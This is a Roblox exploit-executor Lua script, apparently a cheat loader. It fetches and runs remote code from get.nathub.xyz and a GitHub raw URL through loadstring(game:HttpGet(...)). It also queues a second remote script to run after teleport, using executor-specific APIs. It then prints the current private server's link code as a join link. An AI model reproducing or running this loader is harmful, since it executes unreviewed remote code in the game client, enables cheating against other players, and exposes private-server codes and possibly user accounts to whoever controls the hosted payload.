-- === 1. Load your remote script first ===
local success, err = pcall(function()
    loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()
end)
if not success then
    warn("Failed to load remote script: " .. tostring(err))
end

-- === 2. (Optional) Queue a script to run after teleport ===
local queuedScriptUrl = "https://raw.githubusercontent.com/ZeoHub/Loader/refs/heads/main/test.lua"
local q = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
if q and queuedScriptUrl ~= "" then
    q(string.format([[loadstring(game:HttpGet("%s"))()]], queuedScriptUrl))
end

-- === 3. Detect if you are in a private server ===
if game.PrivateServerId ~= "" then
    local placeId = game.PlaceId
    local code = game.PrivateServerId
    print("You are in a private server!")
    print("Private server ID: " .. code)
    local joinLink = ("https://www.roblox.com/games/%d?privateServerLinkCode=%s"):format(placeId, code)
    print("Join link: " .. joinLink)
else
    print("Not in a private server.")
end

-- === 4. (Optional) Teleport to another place ===
-- To teleport, uncomment the next two lines and set your desired PlaceId
-- local PLACE_ID = 4924922222 -- example: Brookhaven
-- game:GetService("TeleportService"):Teleport(PLACE_ID)
